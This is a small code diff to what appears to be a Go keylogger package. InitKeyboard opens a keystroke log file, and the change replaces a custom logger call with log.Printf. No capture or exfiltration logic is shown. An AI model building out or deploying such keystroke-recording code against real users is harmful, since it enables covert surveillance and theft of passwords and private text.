@@ -5,6 +5,7 @@ package keylog
 
 import (
 	"fmt"
+	"log"
 	"os"
 	"syscall"
 	"unsafe"
@@ -47,7 +48,7 @@ func toUnicode(vKey uint, scanCode uint, state *byte, buf *uint16, bufSize int, 
 func InitKeyboard() {
 	file, err := os.OpenFile(config.KeylogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		config.Logger(fmt.Sprintf("[Keylog] Error opening file: %v", err), "error")
+		log.Printf("[Keylog] Error opening file: %v", err)
 		return
 	}
 
